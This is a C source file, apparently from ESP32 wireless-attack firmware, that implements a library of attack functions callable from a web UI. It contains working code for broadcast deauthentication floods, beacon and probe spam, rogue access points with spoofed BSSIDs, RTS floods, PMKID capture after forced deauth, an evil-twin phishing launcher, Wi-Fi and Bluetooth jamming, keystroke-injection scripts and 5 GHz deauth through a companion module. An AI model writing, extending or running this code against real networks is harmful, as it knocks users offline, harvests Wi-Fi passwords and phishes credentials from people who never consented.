/*
 * attack_methods.c — Individual attack methods library
 * 
 * Provides atomic attack operations that can be chained together
 * by the attack system or used individually from the Web UI.
 */

#include "attack_methods.h"
#include "attack_pmkid.h"
#include "attack_deauth.h"
#include "attack_eviltwin.h"
#include "attack_beacon_spam.h"
#include "attack_jammer.h"
#include "attack_bluetooth_jammer.h"
#include "attack_ducky.h"
#include "bw16_uart.h"
#include "wifi_controller.h"
#include "wsl_bypasser.h"
#include "esp_timer.h"
#include "esp_random.h"
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <esp_log.h>
#include <esp_wifi.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>

static const char *TAG = "ATTACK_METHODS";

// ==================== 5GHz CHANNEL LIST ====================
const uint8_t g_5ghz_channels_list[NUM_5GHZ_CHANNELS] = {
    36, 40, 44, 48,        // UNII-1
    52, 56, 60, 64,        // UNII-2 (DFS)
    100, 104, 108, 112,    // UNII-2 Extended (DFS)
    116, 120, 124, 128,    // UNII-2 Extended (DFS)
    132, 136, 140, 144,    // UNII-2 Extended (DFS)
    149, 153, 157, 161, 165 // UNII-3 (non-DFS)
};

// ==================== BROADCAST & ROGUE AP STATE ====================
static volatile bool g_broadcast_running = false;
static TaskHandle_t g_broadcast_task = NULL;
static volatile bool g_rogueap_running = false;
static TaskHandle_t g_rogueap_task = NULL;

// ==================== INTERNAL STRUCT ====================
typedef struct {
    wifi_ap_record_t *ap;
    int rounds;
    int packets_per_round;
} broadcast_config_t;

// ==================== FORWARD DECLARATIONS ====================
static void broadcast_deauth_task(void *params);
static void rogueap_task_func(void *params);

// ==================== BEACON SPAM ====================
void attack_method_beacon_spam(const wifi_ap_record_t *ap, int count) {
    if (!ap) return;
    ESP_LOGI(TAG, "📡 Beacon spam: %s (%d packets)", ap->ssid, count);
    
    uint8_t bssid[6];
    memcpy(bssid, ap->bssid, 6);
    uint8_t ssid_buf[33];
    size_t ssid_len = strlen((const char *)ap->ssid);
    if (ssid_len > 32) ssid_len = 32;
    memcpy(ssid_buf, ap->ssid, ssid_len);
    ssid_buf[ssid_len] = '\0';
    
    for (int i = 0; i < count; i++) {
        wsl_bypasser_send_beacon_frame(bssid, ssid_buf, ssid_len, ap->primary);
        esp_rom_delay_us(100);
    }
}

// ==================== DEAUTH FLOOD ====================
void attack_method_deauth_flood(const wifi_ap_record_t *ap, int count) {
    if (!ap) return;
    ESP_LOGI(TAG, "🔨 Deauth flood: %s (%d packets)", ap->ssid, count);
    
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    
    for (int i = 0; i < count; i++) {
        wsl_bypasser_send_deauth_targeted(ap->bssid, broadcast);
        esp_rom_delay_us(50);
        if (i % 50 == 0) vTaskDelay(pdMS_TO_TICKS(10));
    }
}

void attack_method_deauth_stop(void) {
    g_broadcast_running = false;
    g_rogueap_running = false;
    ESP_LOGI(TAG, "Deauth/DoS methods stopped");
}

// ==================== ROGUE AP ====================
void attack_method_rogueap(const wifi_ap_record_t *ap) {
    if (!ap || g_rogueap_running) return;
    
    ESP_LOGI(TAG, "🕊️ Starting Rogue AP beacon: %s on ch %d", ap->ssid, ap->primary);
    
    wifi_ap_record_t *ap_copy = malloc(sizeof(wifi_ap_record_t));
    if (!ap_copy) return;
    memcpy(ap_copy, ap, sizeof(wifi_ap_record_t));
    
    g_rogueap_running = true;
    
    xTaskCreatePinnedToCore(
        rogueap_task_func,
        "rogueap_beacon",
        3072,
        ap_copy,
        5,
        &g_rogueap_task,
        0
    );
}

static void rogueap_task_func(void *params) {
    wifi_ap_record_t *ap = (wifi_ap_record_t *)params;
    if (!ap) {
        vTaskDelete(NULL);
        return;
    }
    
    ESP_LOGI(TAG, "Rogue AP task running for %s on ch %d", ap->ssid, ap->primary);
    
    esp_wifi_set_channel(ap->primary, WIFI_SECOND_CHAN_NONE);
    vTaskDelay(pdMS_TO_TICKS(50));
    
    uint8_t fake_bssid[6];
    fake_bssid[0] = 0x02;
    fake_bssid[1] = ap->bssid[1];
    fake_bssid[2] = ap->bssid[2];
    fake_bssid[3] = ap->bssid[3];
    fake_bssid[4] = ap->bssid[4];
    fake_bssid[5] = ap->bssid[5];
    
    uint8_t ssid_buf[33];
    size_t ssid_len = strlen((const char *)ap->ssid);
    if (ssid_len > 32) ssid_len = 32;
    memcpy(ssid_buf, ap->ssid, ssid_len);
    ssid_buf[ssid_len] = '\0';
    
    int beacon_count = 0;
    
    while (g_rogueap_running) {
        wsl_bypasser_send_beacon_frame(
            fake_bssid,
            ssid_buf,
            ssid_len,
            ap->primary
        );
        beacon_count++;
        
        if (beacon_count % 50 == 0) {
            vTaskDelay(pdMS_TO_TICKS(10));
        }
        
        if (beacon_count % 100 == 0) {
            vTaskDelay(pdMS_TO_TICKS(5));
        }
        
        esp_rom_delay_us(200);
    }
    
    ESP_LOGI(TAG, "Rogue AP stopped. Beacons sent: %d", beacon_count);
    free(ap);
    g_rogueap_task = NULL;
    vTaskDelete(NULL);
}

void attack_method_rogueap_stop(void) {
    g_rogueap_running = false;
    if (g_rogueap_task) {
        vTaskDelay(pdMS_TO_TICKS(200));
        g_rogueap_task = NULL;
    }
    ESP_LOGI(TAG, "Rogue AP stopped");
}

// ==================== BROADCAST DEAUTH ====================
void attack_method_broadcast(const wifi_ap_record_t *ap, int count) {
    if (!ap) return;
    
    ESP_LOGI(TAG, "📢 Broadcast deauth: ch %d (%d rounds)", ap->primary, count);
    
    if (count <= 5) {
        esp_wifi_set_channel(ap->primary, WIFI_SECOND_CHAN_NONE);
        esp_rom_delay_us(100);
        
        uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        for (int r = 0; r < count; r++) {
            for (int p = 0; p < 20; p++) {
                wsl_bypasser_send_deauth_targeted(ap->bssid, broadcast);
                esp_rom_delay_us(100);
            }
            vTaskDelay(pdMS_TO_TICKS(50));
        }
    } else {
        wifi_ap_record_t *ap_copy = malloc(sizeof(wifi_ap_record_t));
        if (!ap_copy) return;
        memcpy(ap_copy, ap, sizeof(wifi_ap_record_t));
        
        broadcast_config_t *cfg = malloc(sizeof(broadcast_config_t));
        if (!cfg) { free(ap_copy); return; }
        cfg->ap = ap_copy;
        cfg->rounds = count;
        cfg->packets_per_round = 20;
        
        g_broadcast_running = true;
        xTaskCreatePinnedToCore(
            broadcast_deauth_task,
            "bcast_deauth",
            2560,
            cfg,
            5,
            &g_broadcast_task,
            0
        );
    }
}

void attack_method_broadcast_stop(void) {
    g_broadcast_running = false;
    if (g_broadcast_task) {
        vTaskDelay(pdMS_TO_TICKS(200));
        g_broadcast_task = NULL;
    }
    ESP_LOGI(TAG, "Broadcast deauth stopped");
}

static void broadcast_deauth_task(void *params) {
    broadcast_config_t *cfg = (broadcast_config_t *)params;
    if (!cfg || !cfg->ap) {
        if (cfg) free(cfg);
        vTaskDelete(NULL);
        return;
    }
    
    wifi_ap_record_t *ap = cfg->ap;
    int rounds = cfg->rounds;
    int pkts_per_round = cfg->packets_per_round;
    free(cfg);
    
    ESP_LOGI(TAG, "Broadcast deauth task: ch %d, %d rounds", ap->primary, rounds);
    
    esp_wifi_set_channel(ap->primary, WIFI_SECOND_CHAN_NONE);
    esp_rom_delay_us(100);
    
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    int total_sent = 0;
    
    int round = 0;
    while (g_broadcast_running && round < rounds) {
        for (int p = 0; p < pkts_per_round; p++) {
            wsl_bypasser_send_deauth_targeted(ap->bssid, broadcast);
            total_sent++;
            esp_rom_delay_us(80);
        }
        round++;
        
        if (round % 10 == 0) {
            vTaskDelay(pdMS_TO_TICKS(20));
        } else {
            vTaskDelay(pdMS_TO_TICKS(10));
        }
    }
    
    ESP_LOGI(TAG, "Broadcast deauth complete. Total frames: %d", total_sent);
    free(ap);
    g_broadcast_task = NULL;
    vTaskDelete(NULL);
}

// ==================== RTS FLOOD ====================
void attack_method_rts_flood(const wifi_ap_record_t *ap, int count) {
    if (!ap) return;
    ESP_LOGI(TAG, "🌊 RTS flood: %s (%d packets)", ap->ssid, count);
    
    // RTS frame: Frame Control (2) + Duration (2) + RA (6) + TA (6) = 16 bytes
    uint8_t rts_frame[16] = {
        0xB4, 0x00,       // Frame Control: RTS
        0x00, 0x00,       // Duration (will vary)
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // RA (broadcast)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00   // TA (will set below)
    };
    
    uint8_t random_ta[6];
    random_ta[0] = 0x02;
    for (int i = 1; i < 6; i++) random_ta[i] = esp_random() & 0xFF;
    memcpy(&rts_frame[8], random_ta, 6);
    
    esp_wifi_set_channel(ap->primary, WIFI_SECOND_CHAN_NONE);
    esp_rom_delay_us(50);
    
    for (int i = 0; i < count; i++) {
        uint16_t duration = (esp_random() % 500) + 100;
        rts_frame[2] = duration & 0xFF;
        rts_frame[3] = (duration >> 8) & 0xFF;
        
        esp_wifi_80211_tx(WIFI_IF_STA, rts_frame, sizeof(rts_frame), false);
        esp_rom_delay_us(500);
        
        if (i % 100 == 0) vTaskDelay(pdMS_TO_TICKS(5));
    }
}

// ==================== PROBE RESPONSE FLOOD ====================
void attack_method_probe_flood(const wifi_ap_record_t *ap, int count) {
    if (!ap) return;
    ESP_LOGI(TAG, "🔄 Probe response flood: %s (%d packets)", ap->ssid, count);
    
    uint8_t bssid[6];
    memcpy(bssid, ap->bssid, 6);
    uint8_t ssid_buf[33];
    size_t ssid_len = strlen((const char *)ap->ssid);
    if (ssid_len > 32) ssid_len = 32;
    memcpy(ssid_buf, ap->ssid, ssid_len);
    ssid_buf[ssid_len] = '\0';
    
    for (int i = 0; i < count; i++) {
        wsl_bypasser_send_beacon_frame(bssid, ssid_buf, ssid_len, ap->primary);
        esp_rom_delay_us(200);
        
        if (i % 50 == 0) vTaskDelay(pdMS_TO_TICKS(10));
    }
}

// ==================== PMKID CAPTURE ====================
void attack_method_pmkid_capture(const wifi_ap_record_t *ap) {
    if (!ap) return;
    ESP_LOGI(TAG, "🔑 PMKID capture start: %s (ch %d)", ap->ssid, ap->primary);
    
    pmkid_capture_init();
    pmkid_capture_start(ap->primary, false);
    
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    for (int i = 0; i < 5; i++) {
        wsl_bypasser_send_deauth_targeted(ap->bssid, broadcast);
        esp_rom_delay_us(100);
    }
}

// ==================== EVIL TWIN ====================
int attack_method_eviltwin(const wifi_ap_record_t *ap, const char *phishing_page) {
    if (!ap) return -1;
    ESP_LOGI(TAG, "🎣 EvilTwin start: %s (ch %d)", ap->ssid, ap->primary);
    
    eviltwin_start(
        (const char *)ap->ssid,
        NULL,
        ap->bssid,
        ap->primary,
        false,
        phishing_page
    );
    
    return 0;
}

// ==================== JAMMER ====================
void attack_method_jammer_start(void) {
    ESP_LOGI(TAG, "🔥 Jammer start requested");
    jammer_wifi_start();
}

void attack_method_jammer_stop(void) {
    ESP_LOGI(TAG, "Jammer stop requested");
    jammer_stop();
}

// ==================== BLUETOOTH JAMMER ====================
void attack_method_bt_jammer_start(void) {
    ESP_LOGI(TAG, "📱 BT jammer start requested");
    jammer_bt_start();
}

void attack_method_bt_jammer_stop(void) {
    ESP_LOGI(TAG, "BT jammer stop requested");
    jammer_stop();
}

// ==================== WIFI DUCKY (HID) ====================
int attack_method_ducky_inject(const char *script) {
    if (!script) return -1;
    ESP_LOGI(TAG, "🦆 Ducky script injection (%d bytes)", strlen(script));
    return ducky_inject(script);
}

void attack_method_ducky_stop(void) {
    ducky_stop();
}

// ==================== BW16 (5GHz) METHODS ====================
bool attack_method_bw16_scan_5ghz(void) {
    if (!bw16_is_connected()) {
        ESP_LOGW(TAG, "BW16 not connected, cannot scan 5GHz");
        return false;
    }
    
    ESP_LOGI(TAG, "📡 Scanning 5GHz channels via BW16...");
    bw16_send_command("SCAN\n");
    return true;
}

bool attack_method_bw16_deauth_5ghz(uint8_t channel, const uint8_t *bssid) {
    if (!bw16_is_connected()) return false;
    
    char cmd[128];
    if (bssid) {
        snprintf(cmd, sizeof(cmd), "DEAUTH:BSSID %02X%02X%02X%02X%02X%02X CH %d\n",
                 bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], channel);
    } else {
        snprintf(cmd, sizeof(cmd), "DEAUTH:CH %d\n", channel);
    }
    
    bw16_send_command(cmd);
    return true;
}

// ==================== STOP ALL ====================
void attack_method_stop_all(void) {
    ESP_LOGI(TAG, "🛑 Stopping ALL attack methods...");
    
    g_broadcast_running = false;
    g_rogueap_running = false;
    
    attack_method_deauth_stop();
    attack_method_rogueap_stop();
    attack_method_broadcast_stop();
    attack_method_jammer_stop();
    attack_method_bt_jammer_stop();
    attack_method_ducky_stop();
    pmkid_capture_stop();
    eviltwin_stop();
    
    if (bw16_is_connected()) {
        bw16_send_command("STOP\n");
    }
    
    wifictl_restore_ap_mac();
    wifictl_mgmt_ap_start();
    
    ESP_LOGI(TAG, "✅ All attack methods stopped");
}
